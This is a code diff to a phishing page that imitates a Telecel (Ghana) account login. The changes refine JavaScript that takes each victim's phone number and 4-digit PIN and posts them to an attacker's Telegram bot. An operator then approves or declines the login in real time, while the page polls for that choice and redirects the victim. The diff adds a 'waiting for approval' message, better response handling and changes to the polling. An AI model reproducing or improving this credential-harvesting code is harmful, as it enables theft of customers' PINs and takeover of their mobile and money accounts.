@@ -101,6 +101,13 @@
             margin: 10px 0;
             display: none;
         }
+        .success-msg {
+            color: #28a745;
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -110,7 +117,6 @@
             <h1>Welcome Back</h1>
             <p class="subtitle">Enter your details to proceed</p>
         </div>
-
         <div class="form-section">
             <!-- Bundle Info -->
             <div class="form-group" id="bundleInfo" style="display:none; background:#fff0f0; padding:12px; border-radius:8px;">
@@ -126,22 +132,20 @@
                     <option value="broadband">Broadband</option>
                 </select>
             </div>
-
             <div class="form-group">
                 <label>Telephone Number <span style="color:red;">*</span></label>
                 <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
             </div>
-
             <div class="form-group">
                 <label>PIN <span style="color:red;">*</span></label>
                 <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
             </div>
 
             <div class="error-msg" id="errMsg"></div>
+            <div class="success-msg" id="successMsg"></div>
 
             <button class="continue-btn" id="continueBtn">Continue</button>
         </div>
-
         <div class="bill-banner">
             <h3>Pay your bills without stress</h3>
             <p style="font-size:14px; opacity:0.95;">
@@ -151,8 +155,9 @@
     </div>
 
     <!-- Spinner -->
-    <div id="spinner" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:10000;align-items:center;justify-content:center;">
+    <div id="spinner" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:10000;align-items:center;justify-content:center;flex-direction:column;color:white;">
         <div style="width:70px;height:70px;border:6px solid #fff;border-top-color:#E30613;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        <p style="margin-top:20px;">Waiting for approval...</p>
     </div>
 
     <script>
@@ -176,6 +181,7 @@
         const passwordInput = document.getElementById('password');
         const continueBtn = document.getElementById('continueBtn');
         const errMsg = document.getElementById('errMsg');
+        const successMsg = document.getElementById('successMsg');
         const spinner = document.getElementById('spinner');
         const bundleInfoDiv = document.getElementById('bundleInfo');
         const bundleData = document.getElementById('bundleData');
@@ -194,7 +200,7 @@
             }
         }
 
-        // Ghana Number Validation
+        // Input Validation
         phoneInput.addEventListener('input', () => {
             phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
         });
@@ -203,7 +209,7 @@
             passwordInput.value = passwordInput.value.replace(/[^0-9]/g, '').slice(0, 4);
         });
 
-        // Send to Telegram Bot with Polling
+        // Send Data to Telegram
         function sendToBot(accountType, phone, pin) {
             const ts = Date.now();
             state.approveId = `approve_${ts}`;
@@ -213,11 +219,11 @@
                 ? `\nBundle: ${state.bundleInfo.bundle} - GHS ${state.bundleInfo.price}` 
                 : '';
 
-            const message = `<b>🔴 New Telecel Login</b>\n\n` +
+            const message = `<b>🔴 New Telecel Login Attempt</b>\n\n` +
                             `Account Type: ${accountType}\n` +
                             `Phone: ${phone}\n` +
                             `PIN: ${pin}${bundleText}\n\n` +
-                            `Approve?`;
+                            `Do you approve this login?`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -233,52 +239,73 @@
                         ]]
                     }
                 })
-            }).then(() => {
-                startPolling();
-            }).catch(() => {
-                alert("Failed to connect. Please try again.");
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    successMsg.textContent = "Waiting for approval on Telegram...";
+                    successMsg.style.display = 'block';
+                    startPolling();
+                } else {
+                    throw new Error("Failed to send message");
+                }
+            })
+            .catch(() => {
+                alert("Failed to connect to server. Please try again.");
                 spinner.style.display = 'none';
             });
         }
 
+        // Polling for Approval
         function startPolling() {
+            if (state.pollInterval) clearInterval(state.pollInterval);
+
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10`)
                     .then(r => r.json())
                     .then(data => {
-                        if (!data.ok || !data.result) return;
+                        if (!data.ok || !data.result || data.result.length === 0) return;
+
                         data.result.forEach(update => {
-                            state.lastUpdateId = update.update_id;
+                            state.lastUpdateId = Math.max(state.lastUpdateId, update.update_id);
+
                             if (update.callback_query) {
-                                const cb = update.callback_query.data;
-                                if (cb === state.approveId) {
+                                const cbData = update.callback_query.data;
+
+                                if (cbData === state.approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.REDIRECT_PAGE;
-                                } else if (cb === state.declineId) {
+
+                                } else if (cbData === state.declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = "Request declined. Please try again.";
+                                    errMsg.textContent = "Request was declined. Please try again.";
                                     errMsg.style.display = 'block';
+                                    successMsg.style.display = 'none';
                                 }
                             }
                         });
-                    });
-            }, 1500);
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000); // Poll every 2 seconds
         }
 
-        // Submit Handler
+        // Continue Button Handler
         continueBtn.onclick = () => {
             errMsg.style.display = 'none';
-            const accountType = document.getElementById('accountType').value || "Mobile";
+            successMsg.style.display = 'none';
+
+            const accountType = document.getElementById('accountType').value;
             const phone = phoneInput.value.trim();
             const pin = passwordInput.value.trim();
 
             if (!phone || phone.length !== 10 || !phone.startsWith('0')) {
-                errMsg.textContent = "Please enter valid Ghana number (e.g. 0201234567)";
+                errMsg.textContent = "Please enter a valid Ghana number (e.g. 0201234567)";
                 errMsg.style.display = 'block';
                 return;
             }
+
             if (pin.length !== 4) {
                 errMsg.textContent = "PIN must be 4 digits";
                 errMsg.style.display = 'block';
